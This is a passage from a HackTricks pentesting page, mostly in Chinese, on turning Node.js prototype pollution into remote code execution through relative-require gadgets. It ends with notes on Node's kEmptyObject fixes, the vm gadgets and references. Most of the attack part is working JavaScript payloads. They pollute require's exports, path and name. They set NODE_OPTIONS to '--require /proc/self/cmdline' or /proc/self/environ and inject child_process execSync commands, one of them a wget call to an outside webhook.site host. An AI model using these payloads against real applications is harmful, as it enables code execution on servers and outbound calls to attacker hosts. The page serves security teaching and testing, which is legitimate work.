{% endtabs %}</p>
<h4 id="相对-require---2"><a class="header" href="#相对-require---2">相对 require - 2</a></h4>
<p>{% tabs %}
{% tab title="利用" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="malicious.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="相对-require---3"><a class="header" href="#相对-require---3">相对 require - 3</a></h4>
<p>类似于前一个，这在 <a href="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs"><strong>这篇文章</strong></a> 中发现。</p>
<pre><code class="language-javascript">// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
</code></pre>
<h2 id="vm-gadgets"><a class="header" href="#vm-gadgets">VM Gadgets</a></h2>
<p>在论文 <a href="https://arxiv.org/pdf/2207.11171.pdf">https://arxiv.org/pdf/2207.11171.pdf</a> 中也指出，<strong><code>vm</code></strong> 库某些方法的 <strong><code>contextExtensions</code></strong> 控制可以作为一个 gadget。<br />
然而，与之前的 <strong><code>child_process</code></strong> 方法一样，它在最新版本中已被 <strong>修复</strong>。</p>
<h2 id="fixes--unexpected-protections"><a class="header" href="#fixes--unexpected-protections">Fixes &amp; Unexpected protections</a></h2>
<p>请注意，原型污染在访问的对象的 <strong>attribute</strong> 为 <strong>undefined</strong> 时有效。如果在 <strong>code</strong> 中该 <strong>attribute</strong> 被 <strong>设置</strong> 为 <strong>value</strong>，你 <strong>将无法覆盖它</strong>。</p>
<p>在 2022 年 6 月，从 <a href="https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a"><strong>this commit</strong></a> 开始，变量 <code>options</code> 不再是 <code>{}</code>，而是 <strong><code>kEmptyObject</code></strong>。这 <strong>防止了原型污染</strong> 影响 <strong><code>options</code></strong> 的 <strong>attributes</strong> 以获得 RCE。<br />
至少从 v18.4.0 开始，这种保护已被 <strong>实施</strong>，因此 <code>spawn</code> 和 <code>spawnSync</code> 的 <strong>exploits</strong> 不再影响这些方法（如果不使用 <code>options</code>！）。</p>
<p>在 <a href="https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9"><strong>this commit</strong></a> 中，vm 库的 <strong><code>contextExtensions</code></strong> 的 <strong>prototype pollution</strong> 也通过将选项设置为 <strong><code>kEmptyObject</code></strong> 而 <strong>某种程度上修复</strong>。</p>
<h3 id="other-gadgets"><a class="header" href="#other-gadgets"><strong>Other Gadgets</strong></a></h3>
<ul>
<li><a href="https://github.com/yuske/server-side-prototype-pollution">https://github.com/yuske/server-side-prototype-pollution</a></li>
<li><a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">https://github.com/KTH-LangSec/server-side-prototype-pollution</a></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li>
<li><a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/">https://blog.sonarsource.com/blitzjs-prototype-pollution/</a></li>
<li><a href="https://arxiv.org/pdf/2207.11171.pdf">https://arxiv.org/pdf/2207.11171.pdf</a></li>
<li><a href="https://portswigger.net/research/server-side-prototype-pollution">https://portswigger.net/research/server-side-prototype-pollution</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
